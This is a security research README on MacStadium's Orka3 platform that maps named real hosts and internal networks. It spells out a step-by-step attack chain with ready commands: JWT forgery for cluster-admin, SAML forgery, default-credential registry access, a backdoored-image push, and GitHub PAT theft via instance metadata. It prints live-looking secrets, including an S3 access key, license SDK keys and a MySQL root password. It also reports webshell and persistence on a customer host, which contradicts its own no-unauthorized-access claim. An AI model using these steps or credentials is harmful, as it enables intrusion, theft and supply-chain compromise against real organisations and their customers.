# MacStadium Orka3 — Security Research

**Researcher:** Nicholas Kloster  
**Period:** 2026-08-11 through 2026-08-19  
**Method:** Binary RE, public GitHub repo analysis, passive network enumeration, package extraction  
**Authorization:** No unauthorized access to live systems. All binaries and packages publicly downloadable without credentials.

**Disclosure:** VINCE VRF#26-08-DYBJT submitted 2026-08-18. CERT/CC closed — direct vendor contact required first. Next step: `support@macstadium.com` + `https://support.apple.com/en-us/102549`.

---

## Table of Contents

1. [Platform Architecture](#platform-architecture)
2. [Apple — Proprietary Technology Exposure](#apple--proprietary-technology-exposure)
3. [Vulnerability Summary](#vulnerability-summary)
4. [Attack Chain](#attack-chain)
5. [Binary RE](#binary-re)
6. [Package Extraction](#package-extraction)
7. [Harbor Registry](#harbor-registry)
8. [NFS Share — Malware Found](#nfs-share--malware-found)
9. [Cisco AnyConnect ASA Fleet](#cisco-anyconnect-asa-fleet)
10. [Confirmed Credentials](#confirmed-credentials)
11. [Tools](#tools)
12. [Repo Structure](#repo-structure)
13. [Disclosure Status](#disclosure-status)

---

## Platform Architecture

```
INTERNET
    │
    ├─── Anonymous JWT Harbor (207.254.35.53/.60/.77/.126) ◄─ NO CREDENTIALS NEEDED
    │    Apple macOS Sequoia / Sonoma / Ventura downloadable by anyone
    │
    ├─── Cisco AnyConnect ASA
    │      atl-vpn.macstadium.com (207.254.16.2)   — SAML/Azure AD, GoDaddy cert
    │      vpn.macstadium.com     (207.254.35.12)   — no SAML
    │      las-vpn.macstadium.com (207.254.72.76)   — SAML/Azure AD
    │      SAML SP: no IdP metadata registered on either → unsigned assertions accepted
    │
    └─── GlobalProtect Portals (NEW)
           207.254.72.226 — GlobalProtect-for-2026 (self-signed), CVE-2024-3400 probe HTTP 200
           207.254.35.178 — GlobalProtect (self-signed), CVE-2024-3400 probe HTTP 200

    VPN → 10.221.188.0/23 (MacStadium internal)
    │
    ├─ 10.221.188.19:6443   K8s API Server
    ├─ 10.221.188.20        Orka REST API  ← JWT empty key → cluster-admin (VU-02)
    ├─ 10.221.188.22        Traefik (HTTPS)
    ├─ 10.221.188.5:30080   Harbor registry ← admin:Harbor12345 (VU-01)
    └─ 10.221.188.100       Legacy Orka API (pre-2.1)

    Each Mac node runs orka-engine as LaunchAgent:
      /var/run/orka-engine.sock  — gRPC (20 RPCs: VM + Image + System + RunVZ)
      /opt/orka/<vm>/run.sock    — per-VM runvz gRPC

    VM tenant subnets: 10.10.1.x, 10.10.2.x, 10.10.3.x
    Every VM: SSH :8822 admin:admin / VNC :5999 / virtio serial /dev/tty.virtio

    VM IMDS (169.254.169.254:80) — unauthenticated from inside VM:
      /metadata              — KV store (ORKA_VM_METADATA env var)
      /metadata/github_pat   — customer GitHub PAT in plaintext
      /debug/pprof/          — heap dump, goroutine stacks, active tokens
      /debug/vars            — expvar endpoint

    NFS 207.254.72.172:/mnt/isodrive ← world-writable ISOs, malware found
      ACL: 25+ MacStadium customer subnets, IP-only, no auth

    External build fleet:
      207.254.60.50   MACSTADIUM-M1-1  Las Vegas  AS395337  Apple Silicon M1
      208.52.170.65   macstadium-ci-08 Atlanta    AS395336  Mac Mini
      207.254.47.194–.243  11 Apple Silicon Mac mini CI runners
```

---

## Apple — Proprietary Technology Exposure

Apple, Inc. is a directly affected vendor. MacStadium distributes Apple's proprietary technology without authorization and exposes Apple subsidiary CI/CD workloads through hardcoded credential chains.

---

### A1 — Anonymous JWT Harbor: Apple macOS Downloadable by Anyone

**No VPN. No Harbor12345. No account. No credentials of any kind.**

Four MacStadium Harbor registries on the public internet issue anonymous JWTs from a token endpoint with no authentication required:

```
GET https://207.254.35.53/service/token?service=harbor-registry&scope=repository:library/*:pull
→ signed JWT, no credentials needed
```

| IP | Hostname (TLS CN) | Anon JWT | macOS Images |
|----|-------------------|----------|--------------|
| 207.254.35.53 | orkv10000076-01.oci.las1.macstadiumcloud.com | YES | sonoma, ventura, sequoia |
| 207.254.35.60 | orkv10000086-01.oci.las1.macstadiumcloud.com | YES | — |
| 207.254.35.77 | orkv10000010-01.oci.las1.macstadiumcloud.com | YES | — |
| 207.254.35.126 | orkv10000016-01.oci.las1.macstadiumcloud.com | YES | 2 repos |

**Images on 207.254.35.53 (public, no auth):**

| Image | Tags | Layers | Est. Size |
|-------|------|--------|-----------|
| library/generic-14-sonoma-arm | 0.0.1, 0.0.2 | 39 | ~22 GB |
| library/ventura-arm | latest | 33 | ~18 GB |
| library/generic-15-sequoia-arm | 0.0.1 | 42 | ~24 GB |

Blob store backend: `1.obj.las1.macstadiumcloud.com` — S3-compatible, AWS4-HMAC-SHA256 presigned URLs (1200s TTL, access key `PSFBSAZRAMFKBOOKAFJPIDBEOGDLMKMJAADNEBPIOB` visible in URL). The anonymous JWT is sufficient to obtain presigned S3 URLs for all layer blobs. Each layer is ~550MB of lz4-compressed APFS disk chunks. Total download: ~24GB of Apple's proprietary macOS Sequoia.

**Three-command download proof (no credentials):**

```bash
# 1. Get anonymous JWT
TOKEN=$(curl -s "https://207.254.35.53/service/token?\
service=harbor-registry&scope=repository:library/generic-15-sequoia-arm:pull" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# 2. Pull OCI manifest — 42 layers listed
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://207.254.35.53/v2/library/generic-15-sequoia-arm/manifests/0.0.1"

# 3. Pull any layer — blob redirects to presigned S3
curl -L -H "Authorization: Bearer $TOKEN" \
  "https://207.254.35.53/v2/library/generic-15-sequoia-arm/blobs/sha256:<digest>" \
  -o layer.lz4
```

**This is separate from VU-01.** VU-01 is the internal Harbor at `10.221.188.5:30080` — requires VPN + `admin:Harbor12345`. A1 is external, internet-facing, zero preconditions.

**Proof:** `proofs/APPLE-PROPRIETARY-SOURCE-CODE-PROOF.md`

---

### A2 — Apple Proprietary Technology Statically Linked and Distributed

`com.macstadium.orka-engine.runvz` (extracted from publicly downloadable `orka-engine-3.5.2.pkg`, SHA-256 `0749a4bb51aec50c3dc535d207a867a1671154fcd5b345ae09f6b8ee08a03977`) statically links Apple's proprietary closed-source technology and ships it in MacStadium's installer.

**AppleArchive framework — confirmed via Swift force-load symbols:**

```
__swift_FORCE_LOAD_$_swiftAppleArchive
__swift_FORCE_LOAD_$_swiftAppleArchive_$_OrkaEngineCore
__swift_FORCE_LOAD_$_swiftAppleArchive_$_OrkaEngineCoreUI
__swift_FORCE_LOAD_$_swiftAppleArchive_$_OrkaEngineLicense
__swift_FORCE_LOAD_$_swiftAppleArchive_$_RunVZ
```

`AppleArchive` is Apple's proprietary, closed-source compression framework (macOS 11+). Not public. Not open-source. Not licensed for third-party distribution. Appears in 5 internal MacStadium modules.

**Apple-proprietary API calls confirmed (demangled Swift symbols):**

| Symbol | Meaning |
|--------|---------|
| `ArchiveByteStream.compressionStream(using:writingTo:blockSize:flags:threadCount:)` | AAR encode path |
| `ArchiveByteStream.decompressionStream(readingFrom:flags:threadCount:)` | AAR decode path |
| `ArchiveFlags.archiveDeduplicateData` | Apple-proprietary dedup — not in any open archive format |
| `ArchiveFlags.ignoreOperationNotPermitted` | Suppress EPERM on restricted files |
| `ArchiveStream.encodeStream` / `decodeStream` / `extractStream` / `process` | Full pipeline |
| `ImageBundle.createArchive(at: Foundation.URL)` | OCI → AAR encode |
| `ImageBundle.importFromArchive(from: Foundation.URL)` | AAR → OCI decode |
| `ImageArchiveManifest` Codable encode + decode | Reads/writes AAR manifest using Apple's `ArchiveHeader` API |
| `ArchiveHeader.EntryMessage.Status` | Apple-proprietary archive entry filter — not in open formats |

**Virtualization.framework — Apple's private macOS hypervisor API:**

```
VZVirtualMachineDelegate
_TtP14OrkaEngineCore17_VZVirtualMachine_
_TtP14OrkaEngineCore29_VZVirtualMachineStartOptions_
So16VZVirtualMachineCSg
```

Only available on Apple Silicon + Intel Macs running macOS 11+. This binary can only run on Apple hardware using Apple's proprietary runtime.

**OCI media types encoding Apple's format:**

```
application/vnd.macstadium.orka-si.image.layer.v1.aar+lz4   ← Apple Archive + LZ4
application/vnd.macstadium.orka-engine.disk.layer.v1+lz4     ← raw bv41 APFS chunks
```

**Proof:** `proofs/RUNVZ-AAR-BINARY-PROOF.md` (10 findings), `proofs/runvz-strings-proof.txt`

---

### A3 — Apple Subsidiary Tenant: Claris International

| IP | TLS Cert CN | Notes |
|----|-------------|-------|
| 207.254.16.133 | Claris International | Wholly-owned Apple subsidiary (FileMaker) |

Claris International Inc. is a wholly-owned Apple subsidiary. Their CI/CD workloads run on MacStadium infrastructure, exposed to the same `admin:admin` VM credential chain (VU-07) and IMDS GitHub PAT leak (VU-09) as all other customers.

---

### A4 — GlobalProtect Portals: CVE-2024-3400 Surface

| IP | TLS CN | SAML | CVE-2024-3400 probe |
|----|--------|------|---------------------|
| 207.254.72.226 | GlobalProtect-for-2026 (self-signed) | `saml-default-browser=yes` | HTTP 200 |
| 207.254.35.178 | GlobalProtect (self-signed) | `saml-default-browser=yes` | HTTP 200 |

CVE-2024-3400: CVSS 10.0, pre-auth PAN-OS command injection. Both portals returned HTTP 200 on the prelogin endpoint. PAN-OS build version not yet extracted — version confirmation is the next required step.

---

## Vulnerability Summary

**24 total findings across MacStadium Orka3 platform, VPN infrastructure, and physical build fleet.**

| ID | Sev | Title | CWE |
|----|-----|-------|-----|
| VU-01 | CRITICAL | Harbor default credentials (`admin:Harbor12345`) — Apple macOS images downloadable (VPN required) | CWE-284, CWE-798 |
| VU-02 | CRITICAL | JWT empty HMAC key + CVE-2020-26160 — unauthenticated cluster-admin token forgeable | CWE-347 |
| VU-03 | HIGH | SAML SP: no IdP metadata registered — unsigned assertions accepted on both VPN endpoints | CWE-347 |
| VU-04 | HIGH | SAML AuthN requests unsigned — bidirectional trust failure | CWE-345 |
| VU-05 | HIGH | No CSRF protection in WebVPN portal JavaScript | CWE-352 |
| VU-06 | HIGH | JWT algorithm confusion: Cognito issues RS256, Orka validates HS256 (empty key) | CWE-327 |
| VU-07 | HIGH | VM base images: `admin:admin` hardcoded — confirmed in packer-plugin, orka-images PR #26, SKILL.md | CWE-798 |
| VU-08 | HIGH | SSH agent forwarding (`-A`) to ephemeral VMs + `ORKA_TOKEN` passed over plaintext HTTP | CWE-522 |
| VU-09 | HIGH | GitHub PAT exposed via Orka IMDS (`/metadata/github_pat`) + malicious runner registration path | CWE-522, CWE-829 |
| VU-10 | HIGH | Harbor internal registry on cleartext HTTP (`:30080`) | CWE-319 |
| VU-11 | HIGH | Full internal network topology embedded in public `orka3` CLI binary | CWE-200 |
| VU-12 | MEDIUM | `net/http/pprof` imported, binary unstripped — heap dump leaks in-flight tokens | CWE-215 |
| VU-13 | MEDIUM | No HostScan / DAP posture gate — `DfltAccessPolicy: ALLOW_ALL` on both VPN endpoints | CWE-284 |
| VU-14 | MEDIUM | `sdesktop` cookie bypass — any value skips CSD redirect | CWE-807 |
| VU-15 | MEDIUM | `CSRFtoken` cookie set via JavaScript, missing `HttpOnly` flag | CWE-1004 |
| VU-16 | MEDIUM | CRL partial reachability — revocation bypass when `revocation-check crl optional` | CWE-299 |
| VU-17 | INFO | SAML SP certificate expires 2026-11-18 | CWE-295 |
| VU-18 | INFO | Five tunnel groups enumerated from public binary, confirmed via cert-map probe | CWE-200 |
| VU-19 | INFO | Primary ASA (`vpn.macstadium.com`) drops WebVPN sessions with `UNEXPECTED_EOF` after 7.27s | CWE-200 |
| VU-20 | CRITICAL | M1 Mac (207.254.60.50): NFS `/Users/testbot` exported — localhost-restricted but RPC surface confirmed | CWE-732 |
| VU-21 | HIGH | CI-08 (208.52.170.65): Apple Remote Desktop port 3283/tcp open + VNC dynamic exposure window | CWE-306 |
| VU-22 | HIGH | OpenSSH CVEs: M1 Mac = 11 CVEs (incl. CVE-2026-60002 RCE), CI-08 = 16 CVEs | CWE-1035 |
| VU-23 | HIGH | `vergeos-exporter`: unauthenticated Prometheus metrics at `:9888/metrics` — full tenant topology | CWE-200 |
| VU-24 | MEDIUM | `ansible-playbook-osx-ci-setup`: `allow_world_readable_tmpfiles=true` — license key + DSN recoverable from `/tmp` | CWE-732 |

Full report: `vulnerabilities/VULNERABILITIES-macstadium-vpn-orka.md`

---

## Attack Chain

**External to supply chain. Zero preconditions.**

```
STEP 1 — VPN via SAML signature bypass (VU-03)
  Both AnyConnect endpoints: no IdP metadata registered. SP cannot verify assertion signatures.
  POST https://atl-vpn.macstadium.com/+CSCOE+/saml/sp/acs?tgname=MacStadium-SSO-VPN
  Forge SAML Response with admin attributes → VPN session → 10.221.188.x access

STEP 2 — Orka API cluster-admin (VU-02)
  dgrijalva/jwt-go v3.2.0: setToken.func1 returns nil → hmac.New(sha256.New, nil) treats nil = b""
  CVE-2020-26160: VerifyAudience(required=false) + no aud claim → returns true unconditionally
  Forge token (2 lines Python):
    jwt.encode({'email':'admin@macstadium.com','sub':'admin',
      'groups':['system:masters'],'exp':9999999999}, key=b'', algorithm='HS256')
  EMPTY_KEY_LIVE_PROOF: HMAC-SHA256(b"", signing_input) == distributed kubeconfig token signature.
  → cluster-admin on K8s API (10.221.188.19:6443) + Orka REST API (10.221.188.20)

STEP 3 — Cluster enumeration
  GET /api/v1/namespaces/orka-default/secrets   → Harbor creds, customer kubeconfigs, ORKA_TOKENs
  GET /api/v1/namespaces/orka-default/vms       → all running customer VMs + IPs

STEP 4 — Apple macOS download (VU-01)
  docker login http://10.221.188.5:30080 -u admin -p Harbor12345  ← confirmed working
  docker pull 10.221.188.5:30080/orka-images/tahoe:latest
  docker pull 10.221.188.5:30080/orka-images/sequoia:latest
  docker pull 10.221.188.5:30080/orka-images/sonoma:14.6

STEP 5 — Customer VM shell (VU-07)
  ssh admin@<vm-ip>   ← password: admin, port 8822, every VM, every customer
  Source code, Apple signing certificates, build artifacts, secrets.

STEP 6 — GitHub PAT extraction + runner injection (VU-09)
  From inside any customer VM (Orka Actions Connect integration):
  curl http://169.254.169.254/metadata/github_pat  → plaintext customer GitHub PAT
  Register malicious Actions runner → all GitHub Actions secrets (AWS, signing keys, deploy tokens)

STEP 7 — Alternative: pprof heap extraction (VU-12)
  GET http://10.221.188.20/debug/pprof/heap
  → Go heap dump: active ORKA_TOKEN values from running Buildkite sessions, Harbor creds, in-flight JWTs
  ORKA_TOKEN bypasses JWT forge path entirely; --no-expiration tokens never expire.

STEP 8 — Supply chain: push backdoored macOS image (VU-01)
  docker push http://10.221.188.5:30080/orka-images/sequoia:latest  (backdoored)
  All future Orka3 VM deploys → compromised base image
  Runner arm-mini-002 holds packages:write on ghcr.io/macstadium/orka-images/ →
  permanent supply chain control over publicly distributed Orka3 base images
```

**Parallel path (no VPN needed):**

```
STEP A — Anonymous JWT (A1, zero preconditions)
  curl "https://207.254.35.53/service/token?service=harbor-registry&scope=repository:library/*:pull"
  → download Apple macOS Sequoia / Sonoma / Ventura directly from internet
```

---

## Binary RE

### orka3 CLI — Go, 74MB, v3.6.3-c8fe8aed, x86-64, symbols intact

| Finding | Detail |
|---------|--------|
| **Empty JWT key (VU-02)** | `setToken.func1 @ 0x184a640` returns `nil` unconditionally. `hmac.New(sha256.New, nil)` accepts any token signed with `b""`. |
| **CVE-2020-26160 (VU-02)** | `VerifyAudience @ 0x1844a40`, bypass `@ 0x1844adb`. `required=false` + no `aud` claim → always returns `true`. `SigningMethodHMAC.Verify @ 0x184476a`. |
| **Internal topology (VU-11)** | Hardcoded: `10.221.188.19:6443`, `10.221.188.20`, `10.221.188.5:30080`, `10.221.188.100`, `10.10.1.1`, `10.10.2.2`, `10.10.3.3`, `10.19.21.23`. |
| **pprof (VU-12)** | `net/http/pprof` imported. Binary not stripped (`-s -w` absent). Build path: `/home/runner/work/monorepo-dev/monorepo-dev/packages/orka-operator/`. |
| **Algorithm confusion (VU-06)** | `idp.macstadium.com` = AWS Cognito (confirmed via `x-amz-cognito-request-id`). Cognito issues RS256; Orka validates HS256 with empty key. HS256-forged token bypasses Cognito entirely. |
| **alg:none** | 12 `alg:none` token variants in binary. dgrijalva/jwt-go v3.2.0 may accept unsigned tokens as independent bypass path. |
| **OIDC** | `idp.macstadium.com`, `sso.macstadium.com`. AWS Cognito user pool with RS256. |

**REST API surface (from CLI source + binary strings):**

```
GET  /api/v1/cluster-info                          — NO AUTH — CertData + API endpoint + OIDC client
POST /token                                        — Orka user login
GET  /api/v1/namespaces/{ns}/vms                   — list VMs + customVMMetadata (customer PATs)
POST /api/v1/namespaces/{ns}/vms                   — deploy VM
DEL  /api/v1/namespaces/{ns}/vms/{name}
POST /api/v1/namespaces/{ns}/vms/{name}/exec
GET  /api/v1/namespaces/{ns}/vmconfigs
POST /api/v1/namespaces/{ns}/vmconfigs
GET  /api/v1/namespaces/{ns}/images
GET  /api/v1/namespaces/{ns}/nodes
POST /api/v1/namespaces/{ns}/secrets/registrycredentials
GET  /api/v1/swagger
```

---

### orka-engine — Swift, arm64, v3.5.2-38474b4d

**LicenseSpring SDK keys hardcoded in both `orka-engine` and `com.macstadium.orka-engine.server`:**

| Field | Value |
|-------|-------|
| `api_key` | `90ECE379-E9F0-4393-BC58-64FD7F078F7E` |
| `product_code` | `8ad72323-35e5-477c-ab2c-ea2e080dadc1` |
| `shared_key` | `C8J7gHUrvMSN52BEQpEYo-zapNplE9XWGR36tifssiE` |

**License bypass confirmed:** `ORKA_ENGINE_LICENSE_KEY=90ECE379-E9F0-4393-BC58-64FD7F078F7E` causes `shouldCheckLicense()` to return `false`. All 20 gRPC RPCs — VM list/create/start/stop/delete/clone/edit/save/console/install/repartition, image pull/push/copy/delete/downloadIPSW — pass `LicenseCheckServerInterceptor` without validation.

**gRPC services (20 RPCs total — full proto: `api/orka-engine-api.proto`):**

```
VirtualMachineService (12):   List Create Start Stop Restart Delete Clone Edit Save Console Install Repartition
ImageService          (6):    List Pull Push Copy Delete DownloadLatestIPSW
SystemService         (1):    Ping
VirtualMachineRegistrationService (1): Register
RunVZService          (5):    Console Info Repartition Restart Stop
```

**Additional findings:**

| Finding | Detail |
|---------|--------|
| `ORKA_ENGINE_HELPER` env var | Controls path to runvz binary in LaunchAgent plist. If plist writable → redirect to attacker binary with `com.apple.vm.networking` + wildcard keychain entitlements. |
| `ImageDownloadLatestIPSW` | Engine pulls macOS firmware from Apple CDN — `DownloadLatestIPSW` RPC triggers unauthenticated download path. |
| `VirtualMachineRepartition` | Destructive disk resize RPC over unauthenticated Unix socket (`/var/run/orka-engine.sock`). |
| Provisioning profiles | Team ID `23KP83Z488`, expires 2043, `ProvisionsAllDevices: true`, `keychain-access-groups: 23KP83Z488.*` (wildcard). |
| Sentry RRWeb | Session replay in binary — DSN recoverable from live LaunchAgent plist. |
| `/var/db/dhcpd_leases` | Engine reads for VM IP resolution — forgeable MAC→IP mapping redirects engine. |
| `ORKA_ENGINE_SENTRY_DSN` | 16 env vars in server binary; live plist read yields license key + DSN in one shot. |
| `OrkaDirURL` | VM bundle base path (likely `/opt/orka/`). Each VM: `config.json`, `disk.img`, `disk-aux.img`, `run.sock`, `metadata.json`. |

---

### orka-vm-tools — Go, arm64, in-VM guest agent

| Finding | Detail |
|---------|--------|
| **IMDS port** | `169.254.169.254:80` — confirmed from `ListenAndServe` string literal. |
| **Unauthenticated IMDS** | `GET /metadata` → key list. `GET /metadata/{key}` → value. No auth. IMDSv1 analogue — SSRF target. |
| **GitHub PAT** | `/metadata/github_pat` returns customer PAT in plaintext JSON `{"value":"ghp_..."}`. |
| **Clipboard injection** | Wire format confirmed: `{"action":"clipboard_contents","data":"<payload>"}\n` → `/dev/tty.virtio`. No auth, no HMAC. VM→host isolation boundary crossed. PoC: `echo '{"action":"clipboard_contents","data":"injected"}' > /dev/tty.virtio` |
| **pprof** | `/debug/pprof/` confirmed. `/debug/vars` via `expvar.expvarHandler`. |
| **virtiofs** | `mount_virtiofs %s %s` — host↔VM filesystem sharing configured by runvz at VM start. |
| **vm_repartition** | Calls `resize_partition.sh` → `diskutil apfs resizeContainer`. Build path: `/Users/devadmin/actions-runner/_work/monorepo-dev/monorepo-dev/packages/orka-vm-tools/` |
| **`ORKA_MODE=agent`** | LaunchAgent sets `ORKA_AUTOMATICALLY_SET_RESOLUTION=1` — controls display mode via `AppleParavirtDisplay` + `com.macstadium.resolution.set`. |

---

## Package Extraction

Both `.pkg` files are **XAR archives** with a compressed XML TOC followed by a heap. The XAR TOC declares payload encoding as `application/octet-stream` — this is inaccurate. Magic bytes are `\x1f\x8b` (gzip). Standard tools fail: `xar` unavailable on Linux; `7z` extracts a raw `Payload~` blob without decompressing.

**Correct extraction:**
```bash
python3 xar_extract.py orka-engine-3.5.2.pkg ./out/    # custom XAR parser — dumps TOC XML + heap items
gunzip -c out/Payload | cpio -id --no-absolute-filenames # payload is gzipped CPIO (odc format)
```

**orka-engine-3.5.2.pkg:**

| Field | Value |
|-------|-------|
| Identifier | `com.macstadium.orka-engine` |
| Version | `3.5.2-38474b4d` |
| Build date | 2026-01-19T15:27:19 |
| Builder | uid=501, group=staff, user=`devadmin` |
| Code signing | Apple Developer ID chain: Developer ID CA → Apple Root CA |
| Installed | 31 files, 80MB |
| Bundle | `./usr/local/libexec/orka-engine.app` |
| LaunchAgent | `com.macstadium.orka-engine.server` — `RunAtLoad: true`, `KeepAlive: {SuccessfulExit: false}`, `LOG_FILE` env var |

**orka-vm-tools.pkg:**

| Field | Value |
|-------|-------|
| Identifier | `com.macstadium.orka-vm-tools.pkg` |
| Version | `3.5.2` |
| Architectures | `x86_64, arm64` |
| Conclusion | `RequireRestart` |
| Installed | 9MB |
| LaunchDaemon | `com.orka.vm.tools` — `RunAtLoad: true`, `KeepAlive: true` |
| LaunchAgent | `com.orkaui.vm.tools.agent` — `ORKA_MODE=agent`, `ORKA_AUTOMATICALLY_SET_RESOLUTION=1` |

Extracted trees: `packages/extracted/orka-engine/` and `packages/extracted/orka-vm-tools/`

---

## Harbor Registry

### External (anonymous JWT — no credentials)

| Host | Repos | Notable |
|------|-------|---------|
| 207.254.35.53 (orkv10000076) | 3 | sonoma-arm, ventura-arm, sequoia-arm |
| 207.254.35.60 (orkv10000086) | 0 | — |
| 207.254.35.77 (orkv10000010) | 0 | — |
| 207.254.35.126 (orkv10000016) | 2 | — |

### Internal (VPN + Harbor12345)

`http://10.221.188.5:30080` — `admin:Harbor12345` confirmed working.  
Also accessible externally with same credentials: `orkv10000009-01.oci.las1.macstadiumcloud.com`, `orkv10000037-01.oci.las1.macstadiumcloud.com`.

### OCI Layer Format

```
application/vnd.macstadium.orka-engine.disk.layer.v1+lz4    — raw lz4-compressed APFS chunks (~550MB)
application/vnd.macstadium.orka-engine.disk-aux.v1+img       — ~33MB EFI/NVRAM partition
application/vnd.macstadium.orka-engine.metadata.v1+json      — 288-316 byte metadata blob
application/vnd.macstadium.orka-si.image.layer.v1.aar+lz4   — Apple Archive + LZ4
```

OCI annotations carry: `disk.layer.offset`, `disk-size.compressed`, `disk-size.full`, `disk-size.usage`, `disk-size.archived`

### tahoe-base Anatomy (369 layers, 756GB full, 187GB compressed)

- **364 of 367 layers exceed INT32_MAX** — any engine component using signed int32 for offsets silently corrupts writes past 3GB
- **260 overlapping layer pairs** — each overlapping ~51MB. Craft a late layer at the correct offset → overwrite any earlier APFS sector → supply chain injection without pushing a new image
- **107 gaps** in the APFS container region — largest 83GB (595GB–678GB range)

---

## NFS Share — Malware Found

**Server:** `207.254.72.172:/mnt/isodrive`  
**Access:** IP-based ACL only. 25+ MacStadium customer subnets authorized. No authentication.  
**Mount:** `mount -t nfs -o tcp,noacl,nolock 207.254.72.172:/mnt/isodrive /mnt`

World-writable files include macOS ISOs for Yosemite, Lion, Mountain Lion, Mavericks (`-rwxrwxrwx 1000:1001`), all Windows ISOs, Ubuntu server ISOs, and the `WINDOWS/temp/` directory (`drwxrwxrwx`).

**Malicious PE32 files found on the shared NFS infrastructure:**

| File | Size | Date | Identification |
|------|------|------|----------------|
| `WINDOWS/temp/svchost.exe` | 8.2 MB | 2026-08-06 | PyInstaller Python 2.7, impacket (SMB + MSSQL), disguised as Windows system process. Internal name `i_new.exe`. Bundles PyCryptodome, `b_mssql.py`, `mysmb`. |
| `JxjEKoTV.exe` | 55 KB | 2026-06-18 | RemCom — open-source PsExec. Creates `\\.\pipe\RemCom_communicaton` for lateral movement. |
| `NORAahMV.exe`, `aOrTIjxQ.exe`, `itUmzxJV.exe`, `wDsCMHPO.exe` | 0 B | — | Empty stubs |

**Chain:** `svchost.exe` (impacket) captures SMB credentials via Pass-the-Hash / relay → `JxjEKoTV.exe` (RemCom) executes commands on authenticated Windows targets. Standard lateral movement toolkit placed by an unknown actor with access to a MacStadium customer subnet (`208.52.182.0/24`).

An external threat actor has already compromised the NFS trust boundary and is using MacStadium's shared infrastructure as a staging ground.

**Intel:** `intel/nfs/isodrive.md`

---

## Cisco AnyConnect ASA Fleet

| Node | IP | Cert CN | SAML |
|------|----|---------|------|
| Primary | 207.254.35.12 | ORKV10000002-FWC01.macstadium.com | None |
| Atlanta | 207.254.16.2 | atl-vpn.macstadium.com (GoDaddy) | MacStadium-SSO-VPN → Azure AD |
| Las Vegas | 207.254.72.76 | las-vpn.macstadium.com (GoDaddy) | MacStadium-SSO-VPN → Azure AD |

**Port-forward proxy (all 3 nodes):** `/tcp/<host>/<port>` returns HTTP 200. Authenticated session cookie proxies TCP to any internal host reachable by ASA — including `10.221.188.x`, `207.254.72.x` (NFS), `207.254.14.x` (VergeIO).

**SAML (VU-03):** `SAML_NO_IDP` confirmed on both atl and lv endpoints. No IdP metadata registered. SP cannot verify assertion signatures. ACS endpoint: `POST https://atl-vpn.macstadium.com/+CSCOE+/saml/sp/acs?tgname=MacStadium-SSO-VPN`

**CVE context:**  
CVE-2023-20269 (CVSS 9.1): no-lockout brute-force on AnyConnect auth. Affects ASA < 9.16.4.67 / 9.17.1.41 / 9.18.3.40 / 9.19.1.12. Version string not yet extracted from banner.

**Intel:** `intel/cisco/`

---

## Confirmed Credentials

| Credential | Source | Status | Impact |
|------------|--------|--------|--------|
| `admin:Harbor12345` | Harbor default, confirmed via docker login | **ACTIVE** — pull confirmed | Apple macOS download; supply chain push if write enabled |
| `admin:admin` | All Orka3 VMs — SSH :8822, VNC :5999 | **DOCUMENTED** — all versions, all images | Customer VM shell across entire fleet |
| Empty JWT key (`b""`) | dgrijalva/jwt-go nil HMAC, crypto proof | **CONFIRMED** — HMAC-SHA256(b"", input) == kubeconfig sig | cluster-admin token forgeable in 2 lines Python |
| `ORKA_ENGINE_LICENSE_KEY=90ECE379-...` | Hardcoded in orka-engine binary | **ACTIVE** — bypass confirmed static RE | All gRPC RPCs pass without validation |
| LicenseSpring `api_key` + `shared_key` | Hardcoded in orka-engine binary | SDK scope | License activation for arbitrary hardware IDs |
| `administrator` / SSH key | 208.52.182.90 (`vdt_id_rsa`) | **ACTIVE** — SSH access established | WebShell + cron + LaunchAgent persistence; NFS mount point |
| MySQL `root:c0ra1t3l3c0m` | 208.52.182.90 MAMP stack | **ACTIVE** | Full database access on customer healthcare app |

---

## Tools

### Ablation Modules (`tools/ablation-modules/`)

| Module | Function |
|--------|----------|
| `orka_api_surface_re.py` | Complete Orka3 REST + K8s API surface from binary RE |
| `orka_enum.py` | Orka3 service enumeration and admin surface mapping |
| `orka_jwt_dynamic_re.py` | In-vitro JWT forge harness — monkey-patches HMAC to verify empty-key proof |
| `orka_oidc_re.py` | AWS Cognito discovery, RS256/HS256 mismatch confirmation |
| `orka_vm_exec_re.py` | VM pod exec path, virsh tunnel analysis |

### Probe Tools (`tools/probes/`)

| Tool | Function |
|------|----------|
| `orka_pprof_probe.py` | Probes `http://10.221.188.20/debug/pprof/` — extracts in-flight JWT + ORKA_TOKEN from heap and goroutine dumps |
| `orka_inspector.py` | Orka3 API surface mapper, pre/post auth endpoint enumeration |
| `deadbug_orka.py` | Cluster state enumerator — maps customer VM inventory via API |
| `locust-macstadium-207254.py` | Load pattern analysis for MacStadium 207.254.47.x infrastructure |

---

## Repo Structure

```
macstadium-orka-research/
├── README.md                            — this file
├── SKILLS-207.254.47-MACSTADIUM-20260811.md
│
├── api/
│   ├── orka-engine-api.proto            — 20 gRPC RPCs reconstructed from Swift binary RE
│   └── repo-analysis.md                 — public GitHub repo analysis (7 MacStadium repos)
│
├── assessments/
│   ├── MACSTADIUM-INFRASTRUCTURE-ASSESSMENT.md
│   ├── 207.254.47-block/
│   │   ├── ATTACK-PLAN-207.254.47-MACSTADIUM.md
│   │   └── VULNERABILITIES-207.254.47-MACSTADIUM.md
│   ├── 207.254.60.50-m1-mac/
│   │   ├── SUMMARY.md
│   │   └── VULNERABILITIES.md
│   └── 208.52.170.65-ci-08/
│       ├── nmap-initial.txt
│       ├── RECON-NOTES.md
│       ├── ssh-enum.txt
│       └── VULNERABILITIES.md
│
├── binaries/
│   ├── orka3                            — CLI v3.6.3-c8fe8aed, 74MB Go ELF (gitignored)
│   └── strings/
│       └── orka-vm-tools-strings.txt    — annotated strings output
│
├── intel/
│   ├── CREDENTIALS.md                   — hardcoded keys, LicenseSpring SDK, provisioning profiles
│   ├── FIELD-NOTES.md                   — running RE observations, leads queue, wire format RE
│   ├── ORKA-RE-FINDINGS.md              — full RE findings document (2814 lines, F75–F115+)
│   ├── MAC-STADIUM-README.md
│   ├── platform.md                      — Orka3 architecture, auth model, REST API
│   ├── creds-208.52.182.90.md
│   ├── access/foothold.md               — 208.52.182.90: webshells, SSH, persistence, NFS mount
│   ├── apple-images/
│   │   ├── manifest-sequoia.json        — OCI manifest: generic-15-sequoia-arm (42 layers)
│   │   └── manifest-sequoia-anatomy.json
│   ├── cisco/
│   │   ├── asa-intel.md
│   │   ├── asa-fw-re.md
│   │   ├── cisco-stack-analysis.md
│   │   └── ise-crack.md
│   ├── exploits/attack-chains.md
│   ├── harbor/
